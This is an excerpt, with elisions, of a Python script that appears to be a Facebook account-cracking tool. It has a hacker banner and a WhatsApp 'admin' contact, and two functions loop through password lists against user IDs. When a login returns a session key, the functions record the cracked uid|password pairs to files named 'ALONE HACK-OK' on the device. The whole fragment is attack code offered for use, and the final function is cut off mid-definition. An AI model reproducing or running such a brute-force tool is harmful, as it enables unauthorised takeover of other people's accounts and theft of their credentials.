...
#AFG
#WE ARE BROTHERS
#CONTACT WITH ADMIN MRr ALONE AFGHAN's WHATSAPP : +93790510608
...
print('\n\033[1;32m亗𝙏WORK:DATA AND ALSO WI FI❤亗' );time.sleep(1)
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ALONE HACK-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ALONE HACK-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ALONE HACK-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/ALONE HACK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ALONE HACK-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ALONE HACK-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ALONE HACK-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
